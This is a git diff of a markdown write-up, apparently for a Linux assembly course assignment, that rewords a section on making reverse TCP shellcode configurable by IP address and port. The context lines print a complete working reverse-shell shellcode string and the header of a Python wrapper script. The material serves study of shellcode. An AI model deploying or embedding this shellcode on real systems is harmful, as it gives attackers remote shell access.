@@ -597,7 +597,7 @@ id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
 
-#### Configurable Port (Customize Shellcode) 
+#### Configurable IP Address and Port (Customize Shellcode) 
 ------
 
 Objdump is used to extract the shellcode from the Reverse TCP shell in hex format (Null free):
@@ -607,7 +607,7 @@ osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./reverse_shell_tcp|grep '[0-9a-f]:
 "\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\xbf\xff\xff\xff\xff\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xc2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
-Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the port number is easily configurable. 
+Once the raw shellcode has been extracted, the last requirement to complete the assignment is to ensure the IP address and port number are easily configurable. 
 
 This can be achieved by utilising a Python wrapper which takes a standard 2 byte port number, and checks the chosen port number to ensure the custom port is valid.
 
@@ -618,7 +618,7 @@ The shellcode variable defined within the script includes the original hardcoded
 
 # Filename: reverse_shell_tcp_wrapper.py
 # Author: h3ll0clar1c3
-# Purpose: Wrapper script to generate dynamic shellcode, configurable port number
+# Purpose: Wrapper script to generate dynamic shellcode, configurable IP address and port number
 # Usage: python reverse_shell_tcp_wrapper.py <port>
 
 import socket
